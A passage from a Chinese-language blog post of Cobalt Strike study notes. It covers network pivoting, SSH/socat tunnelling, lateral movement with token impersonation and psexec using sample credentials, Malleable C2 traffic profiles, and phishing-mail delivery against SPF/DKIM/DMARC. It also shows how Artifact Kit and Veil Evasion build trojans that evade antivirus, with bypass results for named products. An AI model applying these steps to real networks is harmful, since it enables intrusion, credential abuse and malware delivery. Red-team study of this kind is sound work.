<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">curl</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line"><span class="built_in">curl</span>: (<span class="number">7</span>) Failed to connect to <span class="number">192.168</span>.<span class="number">232.132</span> port <span class="number">80</span>: No route to host</span><br><span class="line"></span><br><span class="line">&gt; proxychains <span class="built_in">curl</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.14</span></span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">80</span>  ...  OK</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http<span class="literal">-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;</span><br><span class="line">……内容太多，此处省略……                 </span><br></pre></td></tr></table></figure>



<h6 id="2、反向转发"><a href="#2、反向转发" class="headerlink" title="2、反向转发"></a>2、反向转发</h6><p>反向转发顾名思义就是和上一节中提到的转发路径相反，之前我们设置的代理是 <code>CS服务端 --&gt; 上线主机 --&gt; 内网主机</code>，反向转发则是 &#96;内网主机 –&gt; 上线主机 –&gt; CS服务端</p>
<p>继续使用上面的演示环境，首先右击上线主机会话，选择 <code>Pivoting --&gt; Listener</code> ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112161902771.png" alt="image-20230112161902771"></p>
<p>之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项，然后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了</p>
<h6 id="3、通过-SSH-开通通道"><a href="#3、通过-SSH-开通通道" class="headerlink" title="3、通过 SSH 开通通道"></a>3、通过 SSH 开通通道</h6><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163229400.png" alt="image-20230112163229400" style="zoom: 40%;" />

<p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@&lt;blue pivot&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p>
</blockquote>
<p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445</span><br></pre></td></tr></table></figure>

<blockquote>
<p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p>
</blockquote>
<p>3、在攻击者控制的主机上运行 beacon，使其上线</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意需要使用 administrator 权限运行 beacon</span><br></pre></td></tr></table></figure>

<p>4、在上线的主机上运行以下命令</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token [DOMAIN\user] [password]</span><br><span class="line">jump psexec_psh &lt;red pivot&gt; [listener]</span><br></pre></td></tr></table></figure>

<p>整体的流程就是下面这张图一样</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163300316.png" alt="image-20230112163300316" style="zoom:50%;" />



<p><strong>示例</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163315027.png" alt="image-20230112163315027" style="zoom:50%;" />

<ol>
<li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@192.168.175.146</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; ssh -D 1080 user@192.168.175.146</span><br><span class="line">user@192.168.175.146&#x27;s password: </span><br><span class="line">Last login: Fri Jul 31 20:00:54 2020 from 192.168.175.1</span><br><span class="line">user@ubuntu:~$ </span><br></pre></td></tr></table></figure>

<p>2、在 Linux1 主机上开启 445 端口转发</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445</span><br></pre></td></tr></table></figure>

<p>3、在 Win1 主机上运行以下命令使 Win2 上线</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token teamssix\administrator Test123!</span><br><span class="line">jump psexec_psh 192.168.175.200 smb</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; make_token teamssix\administrator Test123!</span><br><span class="line">[*] Tasked beacon to create a token <span class="keyword">for</span> teamssix\administrator</span><br><span class="line">[+] host called home, sent: <span class="number">61</span> bytes</span><br><span class="line">[+] Impersonated WINTEST\Administrator</span><br><span class="line"></span><br><span class="line">beacon&gt; jump psexec_psh <span class="number">192.168</span>.<span class="number">175.200</span> smb</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_532c) on <span class="number">192.168</span>.<span class="number">175.200</span> via Service Control Manager (PSH)</span><br><span class="line">[+] host called home, sent: <span class="number">5886</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service <span class="number">4</span>aea3b9 on <span class="number">192.168</span>.<span class="number">175.200</span></span><br><span class="line">[+] host called home, sent: <span class="number">204473</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">232.132</span></span><br></pre></td></tr></table></figure>

<p>4、随后便可以看到通过 SSH 上线的主机</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163445549.png" alt="image-20230112163445549" style="zoom:50%;" />



<h5 id="malleable-命令和控制"><a href="#malleable-命令和控制" class="headerlink" title="malleable 命令和控制"></a>malleable 命令和控制</h5><p>malleable 是一种针对特定领域的语言，主要用来控制 Cobalt Strike Beacon</p>
<p>在开启 teamserver 时，在其命令后指定配置文件即可调用，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [ip address] [password] [profile]</span><br></pre></td></tr></table></figure>

<p><strong>编写配置文件</strong></p>
<p>1、定义事务指标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">	# 指标</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">	# 指标</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、控制客户端和服务端指标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">	client &#123;</span><br><span class="line">		# 指标</span><br><span class="line">	&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		# 指标</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、set 操作</p>
<p>set 语句是给一个选项赋值的方法，以分号结束</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)&quot;;</span><br></pre></td></tr></table></figure>

<p>malleable 给了我们很多选项，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jitter		# 控制 beacon 默认回连的抖动因子</span><br><span class="line">maxdns		# 控制最大 DNS 请求，限制最大数量可以使 DNS Beacon 发送数据看起来正常些</span><br><span class="line">sleeptime	# 控制 beacon 的全部睡眠时间</span><br><span class="line">spawnto</span><br><span class="line">uri</span><br><span class="line">useragent	# 控制每次发送请求的 useragent</span><br></pre></td></tr></table></figure>

<p><code>sleeptime</code> 和 <code>jitter</code> 两个选项是很重要的</p>
<p>添加任意 headers</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">header &quot;Accept&quot; &quot;text/html,application/xhtml&quot;;</span><br><span class="line">header &quot;Referer&quot; &quot;https://www.google.com&quot;;</span><br><span class="line">header &quot;Progma&quot; &quot;no-cache&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br></pre></td></tr></table></figure>

<p>其他指标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header &quot;header&quot; &quot;value&quot;;</span><br><span class="line">parameter &quot;key&quot; &quot;value&quot;;</span><br></pre></td></tr></table></figure>

<p>转换&#x2F;存储数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">metadata &#123;</span><br><span class="line">    netbios;</span><br><span class="line">    append &quot;-.jpg&quot;;</span><br><span class="line">    uri-append;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs23-1.png" alt="img" style="zoom: 67%;" />

<img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs23-2.png" alt="img" style="zoom:67%;" />

<p>数据转换语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">append &quot;string&quot;</span><br><span class="line">base64</span><br><span class="line">netbios</span><br><span class="line">netbiosu</span><br><span class="line">prepend &quot;string&quot;</span><br></pre></td></tr></table></figure>



<p>在GitHub 上有一些配置文件的示例，项目地址：<a target="_blank" rel="noopener" href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p>
<p>这一节将使用该项目中的 <code>Malleable-C2-Profiles/APT/havex.profile</code> 配置文件作为示例</p>
<p><strong>测试配置文件是否有效</strong></p>
<p>可以使用 c2lint 工具对配置文件进行测试，以判断配置文件编写的是否有效。</p>
<p>来到 cobalt strike 目录下，可以看到有一个 c2lint 文件，该文件需要在 Linux 下运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [profile]</span><br></pre></td></tr></table></figure>

<p>在运行的结果中，绿色正常（这里更像青色），黄色告警，红色错误，比如运行 <code>Malleable-C2-Profiles</code> 项目里的 <code>havex.profile</code> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint ./Malleable-C2-Profiles/APT/havex.profile</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs24-1.png" alt="img"></p>
<p>当配置文件存在错误的时候，就会以红色显示出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs24-2.png" alt="img"></p>
<p><strong>运行 teamserver</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [teamserver_ip] [teamserver_password] [profile]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./teamserver 192.168.12.2 password ./Malleable-C2-Profiles/APT/havex.profile</span><br><span class="line">[*] Will use existing X509 certificate and keystore (for SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">[+] I see you&#x27;re into threat replication. ./Malleable-C2-Profiles/APT/havex.profile loaded.</span><br><span class="line">[+] Team server is up on 50050</span><br></pre></td></tr></table></figure>

<p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码</p>
<p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs24-3.png" alt="img"></p>
<h5 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h5><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作</p>
<h6 id="1、DKIM、SPF-和-DMARC"><a href="#1、DKIM、SPF-和-DMARC" class="headerlink" title="1、DKIM、SPF 和 DMARC"></a><strong>1、DKIM、SPF 和 DMARC</strong></h6><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域</p>
<p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件</p>
<p><strong>SMTP</strong></p>
<p>发送一封邮件的过程大概是下面这个样子，这里以QQ邮箱为例。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet smtp.qq.com 25</span><br><span class="line">HELO teamssix</span><br><span class="line">auth login</span><br><span class="line">base64编码后的邮箱名</span><br><span class="line">base64编码后的授权码</span><br><span class="line">MAIL FROM: &lt;evil_teamssix@qq.com&gt;</span><br><span class="line">RCPT TO: &lt;target_teamssix@qq.com&gt;</span><br><span class="line">DATA</span><br><span class="line">邮件内容</span><br><span class="line">.</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>



<p><strong>防御策略</strong></p>
<p><strong>DKIM</strong></p>
<p>DKIM <code>DomainKeys Identified Mail</code> 域名密钥识别邮件，DKIM 是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p>
<p>邮件接收方接收邮件时，会通过 DNS 查询获得公钥，验证邮件 DKIM 签名的有效性，从而判断邮件是否被篡改。</p>
<p><strong>SPF</strong></p>
<p>SPF <code>Sender Policy Framework</code> 发送人策略框架，SPF 主要用来防止随意伪造发件人。其做法就是设置一个 SPF 记录，SPF 记录实际上就是 DNS 的 TXT 记录。如果邮件服务器收到一封来自 IP 不在 SPF 记录里的邮件则会退信或者标记为垃圾邮件。</p>
<p>我们可以使用以下命令查看目标的 SPF 记录  dig +short TXT target.com</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT qq.com</span><br><span class="line">&quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br></pre></td></tr></table></figure>

<p>上面的 <code>include:spf.mail.qq.com</code> 表示引入<code>spf.mail.qq.com</code>域名下的 SPF 记录。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT spf-a.mail.qq.com</span><br><span class="line">&quot;v=spf1 ip4:203.205.251.0/24 ip4:103.7.29.0/24 ip4:59.36.129.0/24 ip4:113.108.23.0/24 ip4:113.108.11.0/24 ip4:119.147.193.0/24 ip4:119.147.194.0/24 ip4:59.78.209.0/24 ip4:113.96.223.0/24 ip4:183.3.226.0/24 ip4:183.3.255.0/24 ip4:59.36.132.0/24 -all&quot;</span><br></pre></td></tr></table></figure>

<p>上面的 <code>ip4:203.205.251.0/24 ip4:103.7.29.0/24</code> 表示只允许这个范围内的 IP 发送邮件。</p>
<p><strong>DMARC</strong></p>
<p>DMARC <code>Domain-based Message Authentication, Reporting &amp; Conformance</code> 基于域的消息认证，报告和一致性。</p>
<p>它用来检查一封电子邮件是否来自所声称的发送者。DMARC 建立在 SPF 和 DKIM 协议上, 并且添加了域名对齐检查和报告发送功能。这样可以改善域名免受钓鱼攻击的保护。</p>
<p>可以使用下面的命令查看目标的的 DMARC 记录  dig +short TXT _dmarc.target.com</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT _dmarc.qq.com</span><br><span class="line">&quot;v=DMARC1; p=none; rua=mailto:mailauth-reports@qq.com&quot;</span><br></pre></td></tr></table></figure>

<p>也有一些在线网站支持检测 SPF、DKIM、DMARC 的记录，比如 <a target="_blank" rel="noopener" href="https://dmarcly.com/tools/">https://dmarcly.com/tools</a></p>
<p><strong>发送钓鱼邮件的一些注意事项</strong></p>
<p>1、检测目标是否有 SPF 记录，如果有则可能会被拦截</p>
<p>2、检测目标 DMARC 记录的 p 选项是否为 reject ，如果有则可能会被拒绝</p>
<p>3、模板中嵌入的 URL 地址，不要使用 IP 地址，要保证使用完整的 URL地址</p>
<p>4、邮件的附件中不能附上一些可执行文件，比如 exe 格式的文件，因为一些邮件过滤器可能会将这些可执行文件删除</p>
<h6 id="2、杀毒软件"><a href="#2、杀毒软件" class="headerlink" title="2、杀毒软件"></a><strong>2、杀毒软件</strong></h6><p>常规杀毒软件的目的就是发现已知病毒并中止删除它，而作为攻击者则需要对病毒文件进行免杀处理，从而使杀毒软件认为我们的文件是合法文件</p>
<p><strong>杀软受到的限制</strong></p>
<p>1、杀毒软件不能把可疑文件删除或者结束运行，否则用户的正常操作可能就会受到影响，同时也会对杀毒软件公司的声誉、口碑产生影响。</p>
<p>2、杀毒软件不能占用太多的系统资源，否则用户可能会考虑卸载杀毒软件。</p>
<p>3、大多数杀毒软件的一个弱点就是只会在浏览器下载文件或者文件被写入磁盘时才会检查这个文件的特征码，也就是说在这种情况下才会检查文件是否是病毒。</p>
<p><strong>如何工作</strong></p>
<p>1、在大多数杀毒软件背后都会有一个已知病毒的签名数据库，通过将当前文件的特征码与病毒签名数据库进行比对，如果一致则说明该文件是病毒。</p>
<p>2、同时一些杀毒软件也会去发现用户的一些可疑行为，而且杀毒软件对这种可疑行为的判定会下比较大的功夫。因为如果误杀，造成的后果可能对用户来说是比较严重的。</p>
<p>3、一些杀毒软件会在沙箱环境中去运行可疑文件，然后根据该可疑文件的行为判断是否为病毒。</p>
<p><strong>如何免杀</strong></p>
<p>首先要判断目标使用了哪款杀毒软件，然后自己在虚拟机中去尝试绕过它。其次可以使用 Cobalt Strike 的 Artifact Kit 组件制作免杀可执行文件</p>
<p><strong>Artifact Kit</strong></p>
<p>Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架, 在 Cobalt Strike 的 <code>Help--&gt;Arsenal</code>处可下载Artifact Kit</p>
<p>Artifact Kit 的工作原理大概如下：</p>
<p>1、将病毒文件进行混淆处理，使杀毒软件将其判定为可疑文件而不是病毒文件。这种混淆可以逃避那些使用简单字符串搜索来识别恶意代码的杀毒软件</p>
<p>2、对病毒文件进行一些处理，以绕过沙箱检测。比如 Artifact Kit 中的 src-common&#x2F;bypass-pipe.c 会生成可执行文件和DLL，它们通过命名管道为自己提供shellcode。如果防病毒沙箱不能模拟命名管道，它将找不到已知的恶意 shellcode</p>
<p>Artifact Kit 的使用步骤大概如下：</p>
<p>1、下载 Artifact Kit</p>
<p>2、如果需要的话就修改&#x2F;混淆病毒文件</p>
<p>3、构建</p>
<p>4、使用 Artifact Kit 加载脚本</p>
<p>首先来看看未进行免杀处理的效果，这里采用 <a target="_blank" rel="noopener" href="https://www.virustotal.com/">virustotal </a>进行检测，发现被 42 个引擎检测到</p>
<p>接下来就试试 Artifact Kit 进行免杀的效果，Github 项目地址：<a target="_blank" rel="noopener" href="https://github.com/Cliov/Arsenal">https://github.com/Cliov/Arsenal</a></p>
<p>这里使用 Artifact Kit 中的 dist-peek 方法进行测试：</p>
<p>Cobalt Strike -&gt; Script Manager<code>，Load 加载 </code>&#x2F;Arsenal&#x2F;artifact&#x2F;dist-peek&#x2F;artifact.cna<code>插件，之后在</code>Attacks -&gt; Packages -&gt; Windows Executable&#96; 中生成木马文件</p>
<p>使用 virustotal 检测仅有 8 个引擎检测到</p>
<p>把每个杀软的病毒库升级到最新后，实测可以过腾讯电脑管家、火绒，但 360 安全卫士 、 360 杀毒不行</p>
<p><strong>Veil Evasion</strong> </p>
<p>此外，也可以使用 Veil Evasion 框架，Veil Evasion 的安装也是比较简单的，Veil-Evasion 在 Kali 2020以前是自带的，但 Kali 2020 中是需要独立安装的。在 Kali 中可以直接使用 apt-get 进行安装。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure>

<p>其他系统可以使用 veil-evasion 项目中的介绍进行安装，项目地址：<a target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p>
<p>由于 Veil Evasion 有 200 多 M ，因此建议挂上代理进行下载安装</p>
<p>安装完成之后，在 Cobalt Strike 里的 <code>Attacks -&gt; Packages -&gt; Payload Generator</code> 中选择 Veil 输出生成一个 payload.txt 文件</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230114165534901.png" alt="image-20230114165534901" style="zoom:50%;" />

<p>随后来到 Kali 下，输入 <code>veil</code> 启动，输入 <code>use Evasion</code> 使用 Evasion 工具，<code>list</code> 查看当前可用的 Payload</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br><span class="line">use Evasion</span><br><span class="line">list</span><br></pre></td></tr></table></figure>

<p>这里使用第 17 个即 <code>go/shellcode_inject/virtual.py</code> Payload 作为示例，因为 go、c 等编译性语言语言相对于 python 等脚本语言来说免杀效果会好些。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 17</span><br></pre></td></tr></table></figure>

<p>之后输入 <code>generate</code>，选择第三项 <code>Custom shellcode string</code> ，粘贴刚生成的 payload.txt 文本内容，输入要生成的 exe 文件名，即可生成一个免杀木马。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">generate</span><br><span class="line">3</span><br><span class="line">粘贴 payload.txt 内容</span><br><span class="line">bypass_go	#生成文件的名称</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230114165636386.png" alt="image-20230114165636386" style="zoom:50%;" />

<p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行</p>
<h6 id="白名单绕过Defender查杀"><a href="#白名单绕过Defender查杀" class="headerlink" title="白名单绕过Defender查杀"></a>白名单绕过Defender查杀</h6><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/779828f3e037c045604e662ad4a52f95f5fb665f.png" alt="image-20230102224037589" style="zoom: 67%;" />

<p><strong>mkdir %SystemDrive%\PHP5433</strong></p>
<p>mimikatz 免杀过 360 安全卫士和 360 安全杀毒</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3161ec6053b2e27555d16ac52c4432dcb7777fff.png" alt="image-20230102224410458" style="zoom:67%;" />



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CS/">CS</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/java-security/java%E5%9F%BA%E7%A1%80/"><img class="prev-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java基础</div></div></a></div><div class="next-post pull-right"><a href="/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sql注入总结</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div 